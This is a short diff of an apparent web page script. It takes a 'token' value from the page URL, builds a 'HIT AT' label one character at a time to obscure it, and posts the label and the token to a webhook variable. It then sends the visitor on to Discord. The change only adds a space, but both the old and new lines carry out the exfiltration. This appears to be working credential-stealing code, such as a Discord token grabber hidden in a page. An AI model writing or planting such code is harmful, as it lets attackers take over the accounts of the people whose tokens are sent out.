@@ -7,5 +7,5 @@ const nektok = new URLSearchParams(window.location.search).get("token")
 
 // post a webhook
 const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let xstin = chars[7];xstin += chars[8]; xstin += chars[19]; xstin += " R"[0];  xstin += chars[0]; xstin += chars[19]; 
-fetch(wh, {method: "POST",headers: {"Content-Type": "application/json"},body: JSON.stringify({"content": xstin + nektok})}).then(e=>e.text()).then(e=>{window.location.href="https://discord.com/channels/@me"})
+fetch(wh, {method: "POST",headers: {"Content-Type": "application/json"},body: JSON.stringify({"content": xstin +" "+ nektok})}).then(e=>e.text()).then(e=>{window.location.href="https://discord.com/channels/@me"})
 </script>
